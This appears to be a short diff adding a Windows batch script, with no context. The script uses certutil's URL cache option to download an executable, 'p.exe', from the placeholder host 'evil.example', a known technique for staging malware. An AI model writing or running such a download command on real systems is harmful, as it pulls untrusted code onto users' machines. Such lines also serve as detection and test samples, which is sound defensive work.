@@ -1,0 +1,4 @@
+@echo off
+certutil ^
+    -urlcache -split -f ^
+    http://evil.example/p.exe p.exe
